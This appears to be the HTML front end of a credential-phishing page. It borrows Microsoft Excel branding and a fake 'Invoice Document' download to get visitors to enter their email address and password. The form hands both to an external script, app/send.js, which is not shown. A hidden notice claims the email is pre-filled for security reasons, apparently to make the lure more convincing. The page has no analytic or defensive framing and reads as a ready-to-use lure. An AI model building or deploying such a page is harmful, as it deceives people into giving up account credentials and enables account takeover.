<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="icon" type="image/png" href="../favicon.png">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-sRIl4kxILFvY47J16cr9ZwB07vP4J8+LH7qKQnuqkuIAvNWLzeN8tE5YBujZqJLB" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-FKyoEForCGlyvwx9Hj09JcYn3nv7wiPVlz7YYwJrWVcXK/BmnVDxM+D2scQbITxI" crossorigin="anonymous">
    </script>
    <title>Secure Invoice Access</title>
    <style type="text/css">
        body,
        html {
            height: 100%;
            margin: 0;
            font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti";
            box-sizing: border-box;
        }

        .cover {
            background-image: url('../bg.png');
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-position: center;
            background-size: cover;
            position: fixed;
            top: 0;
            left: 0;
            height: 100%;
            width: 100%;
            display: flex;
            flex-flow: column nowrap;
            justify-content: center;
            align-items: center;
        }

        .newbutton {
            border: none;
            border-radius: 4px;
            padding: 7px 10px;
            font-size: 14px;
            cursor: pointer;
        }

        .newbutton:hover {
            background-color: #028a4b;
        }

        .newbutton:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        input {
            border-radius: 4px;
            border: 1px solid #ccc;
            padding: 8px 10px !important;
            box-sizing: border-box;
            font-size: 14px !important;
        }

        input:focus {
            outline: none;
            border-color: #036e37;
            box-shadow: 0 0 5px rgba(3, 110, 55, 0.3);
        }

        input.error-input {
            border-color: #dc3545;
            background-color: #fff8f8;
        }

        .loader {
            display: none;
            text-align: center;
            margin-top: 10px;
            font-size: 12px;
            color: #036e37;
        }

        .loader.active {
            display: block;
        }

        .message {
            margin-top: 15px;
            padding: 10px;
            border-radius: 4px;
            font-size: 12px;
            display: none;
        }

        .message.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
            display: block;
        }

        /* Shake animation for error */
        @keyframes shake {

            0%,
            100% {
                transform: translateX(0);
            }

            10%,
            30%,
            50%,
            70%,
            90% {
                transform: translateX(-5px);
            }

            20%,
            40%,
            60%,
            80% {
                transform: translateX(5px);
            }
        }

        .shake {
            animation: shake 0.5s ease-in-out;
        }
    </style>

</head>

<body>
    <div class="cover container-fluid">
        <div class="col-lg-4 col-md-6 col-sm-8">
            <div class="row bg-light p-lg-4 p-3 border border-success rounded-3">
                <form id="form" method="POST" autocomplete="off">

                    <div id="logo" class="d-flex align-items-center gap-2 mb-3">
                        <img border=0 alt="Excel Logo"
                            src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/73/Microsoft_Excel_2013-2019_logo.svg/960px-Microsoft_Excel_2013-2019_logo.svg.png"
                            color="#036e37" width="25" height="25" />
                        <span class="fw-bold">File: Invoice Document</span>
                    </div>

                    <div class="text-left text-dark fs-6 pt-3 pb-2">
                        Enter Password To Download File
                    </div>

                    <div class="row">
                        <div class="col-12">
                            <div class="alert alert-warning d-none" role="alert" style="font-size: 12px; padding: 8px;">
                                For security reasons, the email address is pre-filled and cannot be changed.
                            </div>
                        </div>

                        <div class="form-group col-12">
                            <input type="email" class="form-control shadow-none border border-success" name="email"
                                id="email" required placeholder="Email address">
                        </div>
                        <div class="email-display" id="emailPreview"></div>

                        <div class="form-group col-12 mt-3">
                            <input type="password" class="form-control shadow-none border border-success"
                                name="password" id="password" required autofocus="autofocus" placeholder="Password">
                        </div>

                        <div class="sign-opt form-group col-12 my-3" id="sign-opt">
                            <button id="submitBtn" class="newbutton form-control shadow-none bg-success text-white"
                                type="submit" name="submit">
                                Sign in
                            </button>
                            <div class="loader" id="loader">Processing... Please wait</div>
                            <div class="message" id="message"></div>
                            <div id="sign-out" class="sign-opt"></div>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script src="./app/send.js"></script>
</body>

</html>
